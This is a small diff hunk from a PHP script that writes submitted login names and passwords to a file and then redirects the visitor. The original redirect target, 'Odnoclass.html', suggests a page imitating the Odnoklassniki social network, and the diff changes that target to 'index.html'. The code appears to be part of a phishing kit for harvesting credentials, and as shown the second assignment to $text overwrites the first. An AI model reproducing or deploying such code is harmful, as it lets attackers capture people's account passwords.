@@ -6,5 +6,5 @@ $text = "Логин: $name \n";
 $text = "Пароль: $pass \n";
 fputs($file,$text); 
 fclose($file);
-header("Location:Odnoclass.html");
+header("Location:index.html");
 ?>
